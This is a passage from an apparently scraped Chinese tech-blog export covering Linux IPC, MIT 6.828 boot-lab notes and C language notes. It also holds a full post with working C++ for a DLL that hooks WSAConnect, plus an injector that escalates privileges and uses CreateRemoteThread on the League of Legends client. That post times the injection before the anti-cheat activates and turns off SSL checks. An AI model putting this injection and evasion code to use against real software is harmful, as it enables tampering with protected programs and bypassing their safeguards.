关于套接字的一些小知识 双向通讯 UNIX 域的数据报套接字是可靠的 在本机，很难出现问题，是吧？ UXIX 域的套接字可以传递文件描述符 ？有点读不懂，待验证 对于（狭义）网络通信来说，Internet 域套接字是唯一的方法 UDP 套接字允许广播或多播数据报 socketpair() 在 UNIX 域使用 双向 可以用来做到父子进程的双向通讯 附录：不同 IPC 的 ID 和句柄类型 附录：不同 IPC 的访问权限 附录：不同 IPC 的生命周期 随进程持续，Process 直到最后一个打开它的进程结束 随内核持续，Kernel 直到重启 随文件持续，Filesystem 参考本文主要参考了 Michael Kerrisk 在 linux.conf.au 2013 的 Presentation: An introduction to Linux IPC Michael Kerrisk The Linux Programming Interface 的作者 Linux man-pages maintainer Kernel.org/doc/man-pages 和 man7.org 由他维护","link":"/2022/05/25/%E8%BF%9B%E7%A8%8B%E9%97%B4%E7%9A%84%E9%80%9A%E8%AE%AF%E6%96%B9%E5%BC%8F/"},{"title":"通过 Winsock Hook 监听英雄联盟客户端RTMP通信","text":"英雄联盟和 RTMP 的关系很多人看到这个标题可能会一脸懵逼，RTMP 不是用来搞流媒体传输的吗？赫赫，这你就不懂辣。 从 2016 年拳头发布的 LCU 客户端更新技术细节 中可以看到，在 2008 年 Adobe AIR 的易用性与表达能力远超当时的 HTML，得到了拳头的青睐。而 RTMP 也是 Adobe 主导开发的可靠传输协议，与前者共同处于 Adobe Flash 框架之下，理所当然的被拳头用于客户端数据传输。 时至 2023 年末，拳头和腾讯已经尽可能将 RTMP 协议上的服务迁移到 HTTP，但是仍然有部分通讯由 RTMP 实现（如登录、Teambuilder）。 前人项目经验远在 LCU 客户端更新之前的 2015 年，在 GitHub 上就已经有了一个基于 C#的 RTMP 监听实现，名为 frostycpu/FinalesFunkeln 原理它的主要原理大概如下： 程序会在127.0.0.1:2099启动一个 RTMP 服务器用于转发消息，并同时将消息显示在程序 GUI 在游戏客户端启动时，计算出WSAConnect函数的地址 这个是可行的，因为ws2_32.dll的基地址在不同进程空间的地址不变，只需要提前获取函数的偏移即可计算出内存地址。 因为函数的偏移基本也是固定的，所以可以说 WSAConnect在所有 32 位进程中的地址是一样的。 将已经设计好的字节码直接写入WSAConnect的地址，从而加入自己的逻辑。 这里有一个冷门的知识点，32 位的 WindowsAPI 函数汇编第一句都是 mov edi,edi是有意为之的无意义指令。 而 FinalesFunkeln 正是利用了这一点，实现了简易的热补丁。 详见 Why do Windows functions all begin with a pointless MOV EDI, EDI instruction? - The Old New Thing 在写入的逻辑中会检查WSAConnect的第二个参数，也就是那个sockaddr*指针，如果连接的远程服务器是基于AF_INET的，并且端口是 2099(RTMP 服务默认端口)，则将其服务器地址更改为127.0.0.1，这样我们就成功把消息劫持到了本地的 RTMP 服务 已不可用由于年久失修，这个项目已经不可用状态，原因主要有： SSL 验证机制的变化 游戏客户端从 32 位升级为 64 位，硬编码的的 32 位 Hook 汇编代码失效 那么对应的思路也是有的： 关闭客户端与 RTMP 服务器之间的 SSL 验证 使用 C++重新实现关键函数的 Hook 缝缝补补原来的 FinalesFunkeln 项目中，本地服务器的搭建和对客户端的 Hook 是在同一个项目中的，为了方便，这里我会把原项目中的 Hook 部分独立使用 C++重新编写。 原项目的修补这部分是我一个朋友做的，所以暂时没有办法放出源码，我大概讲一下做什么 删除原有的 AIR 客户端验证逻辑，已经彻底没用了 将 RTMP 服务器地址硬编码，原先的逻辑不适用 腾讯运营的区服中，RTMP 服务器地址一般是区名-cloud-feapp.lol.qq.com，如艾欧尼亚的是hn1-cloud-feapp.lol.qq.com 删除证书验证逻辑，因为我们打算直接关闭 SSL 验证 相应的，需要在system.yaml中的server项下添加如下内容，以关闭 SSL 校验 12345server:# .... lcds: ssl: false# .... Winsock Hook我的逆向工程水平连入门都称不上，Intel 指令集手册让我翻冒烟了我都没做到用 64 位汇编重新实现 Hook 功能，所以我决定从 C++层面实现。这里使用的是我从 GitHub 上找到的一个极简的Hook 库 ，非常好用👍。 我将使用传统派的思路，编写一个 Payload DLL，随后使用远程线程注入。 Payload这里我引入了上面提到的 Hook 库，代码很简单，甚至没检查协议，只需要检查端口是不是 2099 就行了（实测在本端口只有这一处调用） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &quot;WinSock2.h&quot;#include &quot;WS2tcpip.h&quot;#include &quot;Hook.h&quot;#include &quot;Windows.h&quot;#pragma comment(lib, &quot;ws2_32.lib&quot;)typedef int (WSAAPI* LPWSACONNECT)( SOCKET s, const sockaddr* name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS );divert div_hook;LPWSACONNECT fpOriginal;static int HookedWSAConnect( SOCKET s, const sockaddr* name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS) { sockaddr_in* data = (sockaddr_in*)(name); if (data-&gt;sin_port == htons(2099)) { data-&gt;sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); } div_hook.unhook(); int ret = fpOriginal(s, name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS); div_hook.hook(fpOriginal, &amp;HookedWSAConnect); return ret; }BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID) { if (dwReason == DLL_PROCESS_ATTACH) { fpOriginal = reinterpret_cast&lt;LPWSACONNECT&gt;(helper::get_module_export(&quot;ws2_32.dll&quot;, &quot;WSAConnect&quot;)); if (fpOriginal) { div_hook.hook(fpOriginal, &amp;HookedWSAConnect); MessageBoxA(NULL, &quot;WSAConnect Hooked&quot;, &quot;Success&quot;, MB_OK); } } return TRUE;} Injector需要注意的是，国服的LeagueClient.exe尽管是带 ACE 的，但是在最初启动的前两秒左右是未被保护的，我们可以趁这个时候将 Payload 载入到目标进程里。 这里从 KooroshRZ/Windows-DLL-Injector 借用一下提权的逻辑，使用AdjustTokenPrivileges将进程提升到SeDebugPrivilege级别，以防权限不够。 远程线程注入方法是十分简单的，大概可以分为如下几步 将 DLL 地址写入目标进程 获取LoadLibraryA的地址(W 也行，看自己需要) 调用CreateRemoteThread在目标进程执行LoadLibraryA从而加载我们准备好的 Payload 唯一需要注意的点就是，这个 Payload 的路径是相对目标进程的，而非相对注入器，所以我直接在下面写了绝对路径，省事一些。 主体代码也比较简单，不到 40 行 main.cc12345678910111213141516171819202122232425262728#include &lt;Windows.h&gt;#include &lt;iostream&gt;#include &lt;tlhelp32.h&gt;#include &quot;Injector.h&quot;int main() { const wchar_t* processName = L&quot;LeagueClient.exe&quot;; bool processFound = 0; int32_t pid = 0; int epResult = EscalatePrivilege(); if (epResult == 0) printf(&quot;Successfully Escalated privileges to SYSTEM level...\\n&quot;); while (!processFound) { pid = GetProcessIdByName(processName); if (pid == 0) { Sleep(100); // Sleep for 100ms continue; } processFound = 1; printf(&quot;Found LeagueClient.exe PID: %d\\n&quot;, pid); // This path should be relative to `LeagueClient.exe` or use absolute path directly InjectPayload(&quot;D:\\\\myMsg.dll&quot;, OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)); } return 0;} 运行实测基于如上的改动，我们基于如下顺序操作启动游戏 首先启动 FinalesFunkeln 和 注入器 修改客户端的system.yaml以关闭 SSL 校验 运行游戏 WeGame 校验不通过的话，直接用 TCLS 登录，或者其他你想得到的办法 效果图如下：","link":"/2023/12/28/%E9%80%9A%E8%BF%87-Winsock-Hook-%E7%9B%91%E5%90%AC%E8%8B%B1%E9%9B%84%E8%81%94%E7%9B%9F%E5%AE%A2%E6%88%B7%E7%AB%AFRTMP%E9%80%9A%E4%BF%A1/"},{"title":"6.828-Lab1","text":"6.828 的 Lab1 之前用英文洋洋洒洒写了七万多字，稍显冗杂。这次使用 Linux 环境重新走一遍，并且改用中文记录。 Lab 1:Booting a PCPart 1: PC BootstrapGetting Started with x86 assembly本课程的汇编代码使用Intel 语法，请同学们自行阅读该小节给出的资料。 Simulating the x86在这个课程中，我们使用 QEMU 作为模拟器。首先，编译 Boot Loader 和 Kernel： 12345~/6.828/lab lab1 &gt; make+ as kern/entry.S+ cc kern/entrypgdir.c# .. lots of outputs+ mk obj/kern/kernel.img 使用make qemu启动编译好的 Boot Loader 和 Kernel，如果实验机器没有 GUI，请使用make qemu-nox以串口方式连接虚拟机： 12345678910111213141516171819202122~/6.828/lab lab1 &gt; make qemu-noxsed &quot;s/localhost:1234/localhost:26000/&quot; &lt; .gdbinit.tmpl &gt; .gdbinit****** Use Ctrl-a x to exit qemu***qemu-system-i386 -nographic -drive file=obj/kern/kernel.img,index=0,media=disk,format=raw -serial mon:stdio -gdb tcp::26000 -D qemu.log6828 decimal is XXX octal!entering test_backtrace 5entering test_backtrace 4entering test_backtrace 3entering test_backtrace 2entering test_backtrace 1entering test_backtrace 0leaving test_backtrace 0leaving test_backtrace 1leaving test_backtrace 2leaving test_backtrace 3leaving test_backtrace 4leaving test_backtrace 5Welcome to the JOS kernel monitor!Type 'help' for a list of commands.K&gt; 我们已经成功启动了编译好的 Kernel，现在你可以使用Ctrl+a x退出 QEMU。 The PC’s Physical Address Space最初的 PC 是基于 16 位的 8088 处理器，它有 1MB 的物理内存寻址空间，但是用户可以用的只有 640KB 的 Low Memory。 123456789101112+------------------+ &lt;- 0x00100000 (1MB)| BIOS ROM |+------------------+ &lt;- 0x000F0000 (960KB)| 16-bit devices, || expansion ROMs |+------------------+ &lt;- 0x000C0000 (768KB)| VGA Display |+------------------+ &lt;- 0x000A0000 (640KB)| || Low Memory || |+------------------+ &lt;- 0x00000000 一个 32 位 PC 的内存寻址空间如下所示，它保留了 1MB 以下的内存空间布局来确保兼容性。 1234567891011121314151617181920212223242526272829+------------------+ &lt;- 0xFFFFFFFF (4GB)| 32-bit || memory mapped || devices || |/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\/\\| || Unused || |+------------------+ &lt;- depends on amount of RAM| || || Extended Memory || || |+------------------+ &lt;- 0x00100000 (1MB)| BIOS ROM |+------------------+ &lt;- 0x000F0000 (960KB)| 16-bit devices, || expansion ROMs |+------------------+ &lt;- 0x000C0000 (768KB)| VGA Display |+------------------+ &lt;- 0x000A0000 (640KB)| || Low Memory || |+------------------+ &lt;- 0x00000000 出于简化设计的考虑，JOS 仅使用内存空间的前 256MB。 课外话：在 Windows NT 和 Linux Kernel 5.13 的 x86 版本中，前 1MB 内存将无条件保留，以确保内存安全。 The ROM BIOS接下来尝试使用 GDB 调试： 使用make qemu-nox-gdb启动虚拟机，这表明接下来需要 GDB 附加到 QEMU。 使用make gdb启动 GDB，并自动附加到启动的 QEMU 上。 我们可以看到接下来要执行的指令，这是 BIOS 的第一条指令： 1[f000:fff0] 0xffff0: ljmp $0xf000,$0xe05b 我们可以通过这条提示得到以下几点： IBM PC 从 0x000ffff0 开始执行，该地址位于 ROM BIOS 保留的 64KB 区域的最顶部。 PC 从 CS = 0xf000 和 IP = 0xfff0 开始执行。 第一条指令是长跳转指令，它通过设置寄存器 CS = 0xf000 和 IP = 0xe05b 来实现跳转。 问题来了，什么是 CS 和 IP? 这是两个寄存器的名字，CS 是Code Segment，存放某个程序的开始地址，而 IP 是Instruction Pointer，存放下一条指令的偏移。这两个寄存器的值通过如下的公式，即可转换为一个真实的物理内存地址： physical address = 16 * segment + offset 使用这种方式表达内存地址是因为，单个寄存器不足以表达 1MB 大小的寻址空间，具体可以参考我另一篇文章里的详解部分。 0xffff0距离 BIOS 内存空间结束只有 16 字节，所以 BIOS 启动后第一件事情是向前跳跃并不奇怪，毕竟 16 个字节也做不了什么。 早期的 PC 设计中，BIOS 是硬连线到 0x000f0000-0x000fffff 这段空间的，这确保 BIOS 在每次加电后能够获得 PC 的控制权。 BIOS 的工作是进行一系列的初始化，如设置中断向量表和初始化 VGA 显示器等一系列设备。在初始化完毕后，BIOS 就会开始寻找可启动设备并转交控制权，在本节课中，他寻找到的正是下一小节中的 Boot Loader。 Part 2: The Boot LoaderPC 的软硬盘被分为了 512 字节为单位的区域，这种区域叫做扇区。扇区是磁盘的最小传输粒度，每次读写操作都是一个或多个扇区为界限的。 如果说一个磁盘是可启动的，那他的第一个扇区被称为启动扇区，这里存放了 Boot Loader 的代码。当 BIOS 找到启动扇区后，它会把这 512 字节载入内存的0x7c00到0x7dff这段空间，并通过jmp设置 CS:IP 为0000:7c00，这样就把 PC 控制权转交给了 Boot Loader。 Why 0x7C00 here? 对于这节课，我们的 Boot Loader 由两部分组成：boot/boot.S与boot/main.c。仔细阅读这两个文件，确保你知道他们在做什么。 首先，Boot Loader 将处理器从实模式切换到 32 位保护模式，因为我们需要突破 1MB 的寻址空间限制。 其次，Boot Loader 通过特定的 x86 指令，从硬盘中读取 Kernel 并加载到内存。 在你理解了 Boot Loader 源码之后，看一下obj/boot/boot/asm，这是汇编后的代码，它储存了一些重要的地址信息，方便你进行调试，相似地，obj/kern/kernel.asm储存了 Kernel 相关的信息。 Loading the Kernel想要搞明白boot/main.c，你得知道什么是 ELF 二进制文件。 如需深入了解，请查阅给出资料。对于本节课程，你可以认为 ELF 文件是如下结构： 一个定长的文件头 ELF header。 一个变长的 Program header table ，指明了所有 Program sections 的长度与要加载到的对应地址。 有一些段是需要我们关注的： .text: 程序的可执行命令 .rodata: 只读数据，如字符串常量等 .data: 所有初始化的数据，如全局初始化变量(int x = 5) .bss: 储存未初始化全局量(int x)，位于.data之后，仅保存大小和地址，由装载器或者程序本身赋值 你可以使用objdump来查看 Kernel 所有段的名字大小和链接地址： 1234567891011 ~/6.828/lab │ lab1 objdump -h ./obj/kern/kernel ./obj/kern/kernel: file format elf32-i386Sections:Idx Name Size VMA LMA File off Algn 0 .text 000019e1 f0100000 00100000 00001000 2**4 CONTENTS, ALLOC, LOAD, READONLY, CODE 1 .rodata 000006bc f0101a00 00101a00 00002a00 2**5 CONTENTS, ALLOC, LOAD, READONLY, DATA# .. 注意.text段的VMA(链接地址)和LMA(装载地址)时不一样的，装载地址是这个段加载到内存后所在的物理内存地址，链接地址是这个段执行时的期望内存地址。 一般来说，链接地址和装载地址是一样的，比如 Boot Loader 的 ELF 文件中的.text段： 12345678~/6.828/lab lab1 &gt; objdump -h obj/boot/boot.outobj/boot/boot.out: file format elf32-i386Sections:Idx Name Size VMA LMA File off Algn 0 .text 0000018c 00007c00 00007c00 00000074 2**2 CONTENTS, ALLOC, LOAD, CODE Boot loader 会根据 ELF 中的 Program Headers 来决定如何载入以及载入到何处。 可以通过下面的指令获取 kernel 的 Program Headers Table 的信息： 12345678910111213141516~/6.828/lab lab1 &gt; objdump -x obj/kern/kernelobj/kern/kernel: file format elf32-i386obj/kern/kernelarchitecture: i386, flags 0x00000112:EXEC_P, HAS_SYMS, D_PAGEDstart address 0x0010000cProgram Header: LOAD off 0x00001000 vaddr 0xf0100000 paddr 0x00100000 align 2**12 filesz 0x00006d1e memsz 0x00006d1e flags r-x LOAD off 0x00008000 vaddr 0xf0107000 paddr 0x00107000 align 2**12 filesz 0x0000b6c1 memsz 0x0000b6c1 flags rw- STACK off 0x00000000 vaddr 0x00000000 paddr 0x00000000 align 2**4 filesz 0x00000000 memsz 0x00000000 flags rwx 回到boot/main.c，它做的事情简单来说就是读取 Kernel 到内存，然后转交控制权。 它首先把 Kernel 的前 8 个扇区读取到内存中，这次读取的内容被认为足以包含 ELF 头（注意阅读函数体，虽然这里参数 sector 是 0，但是计算后操作的扇区其实是 1）。 123// read 1st page off disk// 其实到这里为止，page 这个概念还不存在。可能作者只是这么表达，4KB的空间，也就是8个扇区。readseg((uint32_t) ELFHDR, SECTSIZE*8, 0); 随后开始读取 ELF header 中的每一个 Program header，并且根据其中信息加载所有的 Segment 到内存中，最后调用 ELF 文件的入口，进入 Kernel。 回看 Kernel 的装载地址和链接地址，不像 Boot Loader， 这两个地址是不一样的：Kernel 告诉 Boot Loader 把它装载到内存的低位地址(0x10000)，但是它希望运行在一个高位地址，在下一节中我们将深入讨论。 Part 3: The Kernel现在我们将开始稍微深入地讨论 JOS kernel。 Using virtual memory to work around position dependence当你观察 Boot Loader 的链接地址和装载地址时，你会发现它们一模一样，然而对于 Kernel 来说却完全不同。 操作系统更加偏好于被链接和运行到非常高的虚拟地址，比如 0xf0100000，这样是为了腾出低位空间给用户使用。下一次的 Lab 中将会详细说明。 0xf0100000 ? 许多机器都没有这么大的内存，所以我们不可能指望把 Kernel 真的放在这么高的位置。作为替代，我们使用处理器的内存管理单元去映射虚拟地址 0xf0100000 (Kernel 希望运行在的地方) 到物理地址 0x00100000 (Boot Loader 将 Kernel 加载到物理内存中的地址)。这样的话，虽然看样子 Kernel 腾出了足够多的空间给用户使用，但是它仍然处在低位，就正好在 BIOS 的空间上面。 实际上，下一次的 Lab 中我们将映射整整 256MB 内存： 物理地址：0x00000000 through 0x0fffffff 虚拟地址：0xf0000000 through 0xffffffff 这就是为什么 JOS 只能使用 256MB 内存，因为它就映射了这么点。 不过现在，我们只映射了前 4MB 物理内存，这足够我们运行起来 Kernel 了。 我们通过在kern/entrypgdir.c中手动编写页目录和页表实现。现在你不用理解其中的细节，只需要了解它的效果。在kern/entry.S设置CRO_PG标志之前，所有内存引用都会被视作物理地址，设置之后则为虚拟地址，会被硬件翻译为物理地址。 entry_pgdir将： 虚拟地址 0xf0000000 through 0xf0400000 翻译到 物理地址 0x00000000 through 0x00400000 虚拟地址 0x00000000 through 0x00400000 翻译到 物理地址 0x00000000 through 0x00400000 任何不处在上述范围内的虚拟地址将硬件异常，因为我们还没有做中断处理，所以它会直接导致 QEMU 异常并 dump 后退出。 Formatted Printing to the Console许多人把printf()当作理所当然的事情，甚至认为这是 C 的原语。但是在 Kernel 中，我们必须自己实现所有的 IO。 阅读 kern/printf.c, lib/printfmt.c, and kern/console.c，确保你了解他们之间的关系。在后续的 Lab 中，你会清楚为什么printfmt.c放在单独的lib文件夹。 The Stack几乎只有题目 Exercises2 Exercise 2. Use GDB’s si (Step Instruction) command to trace into the ROM BIOS for a few more instructions, and try to guess what it might be doing. You might want to look at Phil Storrs I/O Ports Description, as well as other materials on the 6.828 reference materials page. No need to figure out all the details - just the general idea of what the BIOS is doing first. 参考SeaBIOS 实现简单分析 - gnuemacs - 博客园 (cnblogs.com) 首先，通过ljmp重新设置 CS:IP 寄存器，跳跃到低位空间 11 0xffff0: ljmp $0xf000, $0xe05b 随后的两句指令是 QEMU 用于检查系统是否是被恢复/重启的，详见这个StackOverflow 问答 122 0xfe05b: cmpl $0x0, $cs:0x6ac8 3 0xfe062: jne 0xfd2e1 由于这是正常启动，所以接下来会跳转到正常的处理流程。 设置ss为 0，设置esp为 0x7000（其实就是设置sp为 0x7000，正好是esp的低 16 位) 这里的设计就像 CS:IP 一样，表明当前栈顶位于 0*16+7000=0x7000 把要执行的 32 位 C 函数存到edx 跳转到下一个函数，切换到 32 位保护模式 123454 0xfe066: xor %dx, %dx 5 0xfe068: mov %dx, %ss 6 0xfe06a: mov $0x7000, %esp7 0xfe070: mov $0xf34d2,%edx8 0xfe076: jmp 0xfd15c # 跳转到切换模式的函数 后续的切换过程中，暂时屏蔽了中断 cli将 FLAG 寄存器的第 9 位，IF (Interrupt flag)，设置为 0，用于屏蔽可屏蔽中断 通过对 0x70 号端口的操作，屏蔽了不可屏蔽中断。。。 详细说明可以看我之前的英文笔记 1234567899 0xfd15c: mov %eax, %ecx10 0xfd15f: cli 11 0xfd160: cld # Here to disable Maskable Hardware interrupts12 0xfd161: mov $0x8f, %eax13 0xfd167: out %al, $0x70 14 0xfd169: in $0x71, %al# And disable Non-maskable Hardware interrupts 接着开启 A20 总线，关于 A20 的介绍可以参考A20:历史的妥协 - BakaFT’s blog 在 BIOS 开启 A20 总线的原因，似乎是为了计算内存大小，并且对内存进行测试 12315 0xfd16b: in $0x92, %al16 0xfd16d: or $0x2, %al17 0xfd16f: out %al, $0x92 接下来加载中断描述符表 IDT 118 0xfd171: lidtw %cs:0x6ab8 加载全局描述符表 GDT 119 0xfd177: lgdtw %cs:0x6a74 开启保护模式 CR0 is a 32-bit control register, whose first bit (bit 0) is the Protection Enable bit. 这里开启保护模式是因为edx中储存的 32 位 C 函数需要运行在保护模式，由于 Boot Loader 还会再开启一次保护模式，所以 SeaBIOS 应该在后续某处关闭了保护模式 12320 0xfd17d: mov %cr0, %eax21 0xfd180: or $0x1, %eax22 0xfd184: mov %eax, %cr0 后续开始执行 32 位初始化 From x86 Assembly/Global Descriptor Table - Wikibooks, open books for an open world Note that to complete the process of loading a new GDT, the segment registers need to be reloaded. The CS register must be loaded using a far jump 这是原地 ljmp 的原因 From Jump (jmp, ljmp) (IA-32 Assembly Language Reference Manual) (oracle.com) In Real Address Mode or Virtual 8086 mode, the long pointer provides 16 bits for the CS register and 16 or 32 bits for the EIP register. This is how jmp and ljmp work. 1234567823 0xfd187: ljmpl $0x8, $0xfd18f24 0xfd18f: mov $0x10, %eax25 0xfd194: mov %eax, %ds26 0xfd196: mov %eax, %es27 0xfd198: mov %eax, %ss28 0xfd19a: mov %eax, %fs29 0xfd19c: mov %eax, %gs30 0xfd19e: mov %ecx, %eax 最后跳转到之前储存的函数地址 131 0xfd1a0: jmp *%edx 后续将在这个函数内进行 POST 初始化，后续还要初始化中断向量表，初始化设备等，到最后寻找 Boot Loader 并转交控制权。 感觉写的够多了，有兴趣深入可以看看答案开头的参考文章。 3 At what point does the processor start executing 32-bit code? What exactly causes the switch from 16- to 32-bit mode? 在 boot.S中, the ljmp $PROT_MODE_CSEG, $protcseg导致了模式的切换 What is the last instruction of the boot loader executed, and what is the first instruction of the kernel it just loaded? Boot Loader 的最后一句是在main.c中的，这句将控制权转交给了 Kernel 1((void (*)(void)) (ELFHDR-&gt;e_entry))(); Kernel 的第一句是在entry.S中的 1movw $0x1234,0x472 # warm boot Where is the first instruction of the kernel? 这道题的意思是，解引用指针 0x10018，获取入口点真正的地址 12345678910(gdb) b *0x7d71Breakpoint 1 at 0x7d71(gdb) cContinuing.The target architecture is set to &quot;i386&quot;.=&gt; 0x7d71: call *0x10018Breakpoint 1, 0x00007d71 in ?? ()(gdb) x/1x 0x100180x10018: 0x0010000c How does the boot loader decide how many sectors it must read in order to fetch the entire kernel from disk? Where does it find this information? Boot Loader 会从 ELF 头中获取所有的 Program Header，每个 Header 都指明了要加载的段，并挨个加载到内存中，等加载完了，内核也就全部载入了。 5 Exercise 5. Trace through the first few instructions of the boot loader again and identify the first instruction that would “break” or otherwise do the wrong thing if you were to get the boot loader’s link address wrong. Then change the link address in boot/Makefrag to something wrong, run make clean, recompile the lab with make, and trace into the boot loader again to see what happens. Don’t forget to change the link address back and make clean again afterward! 这里很诡异，我把 0x7c00 改成 0x8c00，重新 make 之后，好像一切都没改过。 Boot Loader 的代码甚至还在 0x7c00 123456789(gdb) b *0x7c00Breakpoint 1 at 0x7c00(gdb) cContinuing.[ 0:7c00] =&gt; 0x7c00: cliBreakpoint 1, 0x00007c00 in ?? ()(gdb) si[ 0:7c01] =&gt; 0x7c01: cld0x00007c01 in ?? () 但是不久之后你会察觉到不对劲，怎么 GDT 内存地址都变负数了？到最后甚至引发了 QEMU 的 Triple fault 123456789101112131415...(gdb) si[ 0:7c1e] =&gt; 0x7c1e: lgdtw -0x739c0x00007c1e in ?? ()...(gdb) si[ 0:7c2a] =&gt; 0x7c2a: mov %eax,%cr00x00007c2a in ?? ()(gdb) si[ 0:7c2d] =&gt; 0x7c2d: ljmp $0x8,$0x8c320x00007c2d in ?? ()(gdb) siProgram received signal SIGTRAP, Trace/breakpoint trap.[ 0:7c2d] =&gt; 0x7c2d: ljmp $0x8,$0x8c320x00007c2d in ?? () GDT 仍然在原来的 0x7c64，而-0x739c 更是不知道飞到哪里了(应该是溢出了) 1234(gdb) x/6xb -0x739c0xffff8c64: 0x04 0x26 0x67 0x66 0x89 0x07(gdb) x/6xb 0x7c640x7c64: 0x17 0x00 0x4c 0x8c 0x00 0x00","link":"/2022/11/10/6-828-Lab1-cn/"},{"title":"C Primer Plus 笔记","text":"简介存一些零碎知识点 开的有点迟，前面的没记 逗号表达式1234int x = (2,3);int y = 2,3;printf(&quot;%d %d&quot;,x,y);// x=3 y=2 7else if 的本质实际上，else if 是己学过的 if else 语句的变式。 12345678if (kwh &lt;= BREAK1) bill = RATE1 * kwh;else if (kwh &lt;= BREAK2) // kwh between 360 and 468 bill = BASE1 + (RATE2 * (kwh - BREAK1));else if (kwh &lt;= BREAK3) // kwh betweent 468 and 720 bill = BASE2 + (RATE3 * (kwh - BREAK2));else // kwh above 680 bill = BASE3 + (RATE4 * (kwh - BREAK3)); 其与如下代码等价 12345678910if (kwh &lt;= BREAK1) bill = RATE1 * kwh;else if (kwh &lt;= BREAK2) // 360~468 kwh bill = BASE1 + (RATE2 * (kwh - BREAK1)); else if (kwh &lt;= BREAK3) // 468~720 kwh bill = BASE2 + (RATE3 * (kwh - BREAK2)); else // 超过 720 kwh bill = BASE3 + (RATE4 * (kwh - BREAK3)); else 与 if 的配对规则如果没有花括号，else 与离它最近的 if 匹配，除非最近的 if 被花括号括起来 12345if (number &gt;6) if (number &lt;12) printf(&quot;Case a\\n&quot;);else printf(&quot;Case b\\n&quot;); 如果number的值是 5，程序将没有输出。 因为例中的 else 是和第二个 if 匹配的，改变一下缩进可能会更加明显。 12345if (number &gt;6) if (number &lt;12) printf(&quot;Case a\\n&quot;); else printf(&quot;Case b\\n&quot;); 条件运算符1x = (y&lt;0) ?-y:y; switch 语句case 下记得放个 break, 否则会匹配后面所有 case goto 语句一般用于跳出多层循环 9return 语句C 中，return 语句无法返回两个及以上的值，必要可使用指针进行操作 间接运算符声明指针1int * ptr = &amp;num; 求值(解引用)其实就是取指针指向的地址的内容 1val = *ptr; 10未指定长度的不可变数组1const int array[] = {1,2,3,4,5,6,7}; 指定初始化容器(C99)12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#define MONTHS 12int main(void){ int days[MONTHS] = {31,28, [4] = 31,30,31, [1] = 29}; int i; for (i = 0; i &lt; MONTHS; i++) printf(&quot;%2d %d\\n&quot;, i + 1, days[i]); return 0;}// output:// 1 31// 2 29// 3 0// 4 0// 5 31// 6 30// 7 31// 8 0// 9 0// 10 0// 11 0// 12 0 1234567891011// 稍作变化#define MONTHS 7int days[MONTHS] = {[4] = 31,30,31};// output:// 1 0// 2 0// 3 0// 4 0// 5 31// 6 30// 7 31 这种方法可以用于初始化指定位置的元素，而初始化其之前的元素 注意到，第一个例子中，对索引为1的元素进行了重复赋值，编译器选择使用第二次的值覆盖了第一次的值 如果这种初始化方法用于未指定长度的数组会怎么样？ 1int array[] = {1,[1] = 2,3,4,5,6}; 编译器会创建一个能装得下初始化数值的数组，即长度为6的数组 数组下标越界的后果123456789101112131415161718192021222324252627282930313233343536373839404142// bounds.c -- exceed the bounds of an array#include &lt;stdio.h&gt;#define SIZE 4int main(void){ int value1 = 44; int arr[SIZE]; int value2 = 88; int i; printf(&quot;value1 = %d, value2 = %d\\n&quot;, value1, value2); for (i = -1; i &lt;= SIZE; i++) arr[i] = 2 * i + 1; for (i = -1; i &lt; 7; i++) printf(&quot;%2d %d\\n&quot;, i , arr[i]); printf(&quot;value1 = %d, value2 = %d\\n&quot;, value1, value2); printf(&quot;address of arr[-1]: %p\\n&quot;, &amp;arr[-1]); printf(&quot;address of value1: %p\\n&quot;, &amp;value1); printf(&quot;address of value2: %p\\n&quot;, &amp;value2); printf(&quot;address of arr[6]: %p\\n&quot;, &amp;arr[6]); return 0;}// output:// value1 = 44, value2 = 88// -1 -1// 0 1// 1 3// 2 5// 3 7// 4 9// 5 0// 6 44// value1 = 44, value2 = -1// address of arr[-1]: 000000000061FDFC// address of value1: 000000000061FE18// address of value2: 000000000061FDFC// address of arr[6]: 000000000061FE18 注意，value2和arr[-1]的内存地址相同，value1和arr[6]的内存地址相同，而arr的正常索引范围应该是0-3 在对数组进行循环赋值后，value2的值发生了变化 这意味着，在修改数组元素的值时，如果下标越界，会修改数组之外的内存地址的值，可能是某个变量，也可能是其他东西 VLA(C99)C99 之前，声明数组的时候方括号里的数字，也就是数组的长度，只能使用整型常量表达式，且运算结果大于 0 1234int test[5];int arr[(int)2.5];int arr[2*5];int arr[sizeof(test)]; C99 中，允许变量表示数组长度 1234int n = 8;const int m = 8;int arr[n];int arr[m]; // C99/C11允许 这就是 VLA (Variable-length-array)，可变长度数组 VLA 必须是自动储存类别，这意味着它无法使用static,extern等储存类别说明符修饰 另外，在作为形参声明时，变量必须先于数组 12int func(int ar[col][row], int col, int row); // 无效int func(int col, int row, int ar[col][row]); // 合法 在函数原型中，可以如下声明 1int func(int, int, int[*][*]); // 省略变量名后，使用星号替代 二维数组初始化1234567#include &lt;stdio.h&gt;int main(void){ int test[2][2] = {0,1,2,3}; // 更真实地反应内部储存方式 printf(&quot;The first number is %d\\n&quot;,test[0][0]); printf(&quot;The last number is %d&quot;,test[1][1]); } 1234567891011#include &lt;stdio.h&gt;int main(void){ int test[2][2] = // 更加的直观 { {0,1}, {2,3} }; printf(&quot;The first number is %d\\n&quot;,test[0][0]); printf(&quot;The last number is %d&quot;,test[1][1]); } 123// output:// The first number is 0// The last number is 3 同样地，如果某个数组未初始化完全，剩下的值会被设为 0 如果某个数组初始化时元素数量超过了数组长度，不会影响其他数组的初始化 二维数组的”内层越界”二维数组看作是一种特殊的一维数组 12345678910#include &lt;stdio.h&gt;int main(void){ int test[2][2] = { {0,1,5,6}, {2234,3} }; printf(&quot;The number is %d\\n&quot;,test[0][2]);} 猜猜输出是多少？是2234 数组的第一行在初始化的时候输入了 4 个元素，但是因为每行长度为2，所以后面两个元素被舍弃 最后的数组应该是这样 1234{ {0,1}, {2234,3}} test[0][2]，想想似乎是越界的，因为每个数组索引最大是1 但是 C 